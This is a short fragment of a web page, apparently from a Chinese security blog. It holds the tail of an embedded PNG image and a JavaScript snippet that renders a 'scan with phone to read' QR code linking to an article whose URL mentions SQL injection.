/x/0Gdfw1sGAvWtGm0OoY+0zMGxD4613MO53lIFRB2MUZ422h5Ztwa134iD0HMt9NxbBuIHWvj6CayBvH5mb63oBpKv1CifPc1Vv30QVxYqWhth3numZ801EHtkbZTbf4YQ/UY+983aiMu6824gFhbecwJlIBATh2t49XGvvhmjfrB/lpEnc94Lal3WlUPVoM/lUUDV3Fe8Y8RZg6j1OiOEBuP/3LoMJBet/L4TWAO57+yHO/8LAAD//4xcn+sAAAAGSURBVAMAa8brodM8SMcAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/unibox-api-postprosa-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 